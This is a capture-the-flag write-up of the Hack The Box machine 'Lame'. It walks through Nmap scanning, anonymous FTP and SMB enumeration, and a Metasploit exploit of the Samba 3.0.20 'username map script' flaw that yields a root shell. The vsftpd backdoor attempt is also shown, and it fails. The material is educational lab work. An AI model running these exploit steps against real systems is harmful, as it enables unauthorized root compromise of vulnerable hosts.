---
title: "Lame"
---

## Introduction

![Cap dashboard screenshot](Lame.png)

**Lame** was the first machine released on Hack The Box, and it remains a great starting point for beginners. It highlights classic issues in outdated services and offers a direct route to root access. In this write-up, I’ll go through the enumeration process and show multiple ways to compromise this Linux host.

## Initial Reconnaissance

I began with a full Nmap scan to identify open ports and running services.

```bash
nmap -p- -sC -sV 10.10.10.3 -oA nmap/full-scan
```

### Nmap Results

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2025-04-22 14:30 EDT
Nmap scan report for 10.10.10.3
Host is up (0.023s latency).
Not shown: 65530 closed tcp ports (reset)

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan exposed several possible attack surfaces:
- FTP on port 21 with anonymous login enabled.
- SSH on port 22.
- Samba on ports 139 and 445.
- distccd on port 3632.

## Vulnerability Assessment

### FTP Server

The FTP service is running `vsftpd 2.3.4`, which is known for a backdoor issue in some versions. I tested anonymous login first:

```bash
ftp 10.10.10.3
```

Anonymous access worked, but there were no useful files to retrieve. I then tried the known vsftpd backdoor with Metasploit:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.3
run
```

That attempt did not succeed, so FTP was not the entry point here.

### Samba Server

Samba looked more promising, so I enumerated available shares:

```bash
smbclient -L //10.10.10.3 -N
```

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
```

I connected to the `tmp` share without credentials:

```bash
smbclient //10.10.10.3/tmp -N
```

This confirmed that anonymous access was allowed. Searching for public exploits against this Samba version revealed a command execution flaw:

```bash
searchsploit samba 3.0.20
```

```text
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script | unix/remote/16320.rb
```

This username map script issue can be used for remote code execution.

### distccd

The `distccd` service on port 3632 also appeared vulnerable, so I checked for available exploits:

```bash
searchsploit distccd
```

```text
DistCC Daemon - Command Execution (Metasploit) | multiple/remote/9915.rb
```

This gave another possible path to code execution, but Samba remained the most direct route.

## Exploitation

I used the Samba username map script vulnerability with Metasploit:

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
exploit
```

This immediately returned a root shell:

```text
meterpreter > shell
Process 2539 created.
Channel 1 created.
whoami
root
```

## Attack Path

- Scan the host to identify open services.
- Test anonymous FTP access.
- Enumerate Samba shares.
- Identify Samba 3.0.20 as vulnerable.
- Exploit the username map script vulnerability.
- Obtain a root shell directly.
